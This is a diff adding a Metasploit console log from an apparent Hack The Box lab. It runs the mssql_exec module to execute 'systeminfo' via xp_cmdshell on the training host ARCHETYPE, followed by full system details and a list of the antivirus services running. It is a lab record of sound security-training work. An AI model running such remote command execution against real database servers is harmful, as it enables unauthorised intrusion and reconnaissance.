@@ -1,0 +1,62 @@
+[*] Spooling to file /home/dks/Development/hackthebox/gettingStarted/osinfo...
+[4mmsf6[0m auxiliary([1m[31madmin/mssql/mssql_exec[0m) [0m> run
+[*] Running module against 10.10.10.27
+
+[*] 10.10.10.27:1433 - SQL Query: EXEC master..xp_cmdshell 'systeminfo'
+
+
+
+ output
+ ------
+ 
+ Host Name:                 ARCHETYPE
+ OS Name:                   Microsoft Windows Server 2019 Standard
+ OS Version:                10.0.17763 N/A Build 17763
+ OS Manufacturer:           Microsoft Corporation
+ OS Configuration:          Standalone Server
+ OS Build Type:             Multiprocessor Free
+ Registered Owner:          Windows User
+ Registered Organization:
+ Product ID:                00429-00521-62775-AA442
+ Original Install Date:     1/19/2020, 11:39:36 PM
+ System Boot Time:          8/10/2020, 1:41:04 AM
+ System Manufacturer:       VMware, Inc.
+ System Model:              VMware7,1
+ System Type:               x64-based PC
+ Processor(s):              1 Processor(s) Installed.
+ [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+ BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
+ Windows Directory:         C:\Windows
+ System Directory:          C:\Windows\system32
+ Boot Device:               \Device\HarddiskVolume2
+ System Locale:             en-us;English (United States)
+ Input Locale:              en-us;English (United States)
+ Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+ Total Physical Memory:     2,047 MB
+ Available Physical Memory: 1,124 MB
+ Virtual Memory: Max Size:  2,431 MB
+ Virtual Memory: Available: 1,462 MB
+ Virtual Memory: In Use:    969 MB
+ Page File Location(s):     C:\pagefile.sys
+ Domain:                    WORKGROUP
+ Logon Server:              N/A
+ Hotfix(s):                 2 Hotfix(s) Installed.
+ [01]: KB4532947
+ [02]: KB4464455
+ Network Card(s):           1 NIC(s) Installed.
+ [01]: vmxnet3 Ethernet Adapter
+ Connection Name: Ethernet0 2
+ DHCP Enabled:    No
+ IP address(es)
+ [01]: 10.10.10.27
+ [02]: fe80::593f:516:9315:fd53
+ [03]: dead:beef::593f:516:9315:fd53
+ Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+
+#Service info
+Running WdNisSvc Windows Defender Antivirus Network ...  
+Stopped Wecsvc Windows Event Collector
+Stopped  WerSvc             
+Windows Error Reporting Service                                                            
+Running  WinDefend          Windows Defender Antivirus Service
